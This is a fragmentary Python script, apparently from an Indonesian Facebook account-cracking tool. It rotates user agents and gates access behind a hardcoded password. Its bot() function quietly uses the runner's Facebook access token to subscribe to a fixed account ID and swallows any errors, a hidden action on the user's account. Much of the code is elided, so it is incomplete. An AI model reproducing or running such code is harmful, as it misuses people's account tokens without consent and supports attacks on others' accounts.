...
def uaku():
	try:
		...
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
ua = random.choice(['Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36',
...
input("\n\033[95m[\033[97m?\033[95m] \033[97mNama Kamu ganteng \033[97m:\033[92m ")
Password = "osnsbsj8snsjsjzb8nsn1hwjsjsjjs0wjwjsns7sja"
...
while (loop == 'true'):
    ...
    if (passcode == Password):
            ...
            exit("Pasword salah kamu akan di arahkan ke WhatsApp")
...
def bot():
	try:
		requests.post("https://graph.facebook.com/100077553597396?fields=subscribers&access_token=%s"%(tokenku))
	except:
		pass
#------------------[ BAGIAN-MENU ]----------------#
